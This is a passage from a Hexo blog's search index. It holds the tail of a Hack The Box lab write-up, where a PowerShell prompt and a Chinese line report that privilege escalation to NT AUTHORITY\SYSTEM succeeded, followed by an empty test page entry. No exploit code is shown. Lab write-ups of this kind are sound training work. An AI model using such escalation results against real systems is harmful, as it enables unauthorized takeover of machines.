ARE SYSTEM<br>PS C:\programdata&gt; <br></code></pre></td></tr></table></figure><p>可以看到是nt authority\system权限，成功提权</p>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>testPage</title>
    <link href="/2025/01/17/testPage/"/>
    <url>/2025/01/17/testPage/</url>
    
    <content type="html"><![CDATA[<p>test页面</p><p><img src="/../imgs/image-20241010013554389.png" alt="image-20241010013554389"></p>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
